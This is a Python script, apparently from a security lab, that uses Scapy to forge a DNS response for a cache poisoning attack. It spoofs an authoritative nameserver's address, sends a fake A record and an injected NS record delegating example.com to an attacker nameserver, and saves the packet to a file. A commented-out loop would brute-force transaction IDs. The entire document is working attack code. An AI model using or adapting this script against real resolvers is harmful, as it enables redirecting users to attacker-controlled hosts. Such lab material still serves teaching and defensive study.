from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import UDP, IP


def send_spoofed_response():
    name = "abcde.example.com"  # abcde - placeholder for random subdomain
    domain = "example.com"      # The domain to spoof
    ns = "ns.attacker32.com"    # The attacker's nameserver
    Qdsec = DNSQR(qname=name)
    Anssec = DNSRR(rrname=name, type="A", rdata="1.2.3.4", ttl=259200)
    NSsec = DNSRR(rrname=domain, type="NS", rdata=ns, ttl=259200)
    dns = DNS(id=0xAAAA, aa=1, rd=1, qr=1, qdcount=1, ancount=1, nscount=1, arcount=0, qd=Qdsec, an=Anssec, ns=NSsec)
    ip = IP(dst="10.9.0.53", src="199.43.133.53")   # src is the Authoritative NS, dst is the local DNS server
    udp = UDP(dport=33333, sport=53, chksum=0)
    reply = ip/udp/dns

    # Save the response to a binary file
    with open("ip_resp.bin", "wb") as file:
        file.write(bytes(reply))

if __name__ == "__main__":
    # for dns_id in range(0, 65536):  # Loop through all possible transaction IDs
    send_spoofed_response()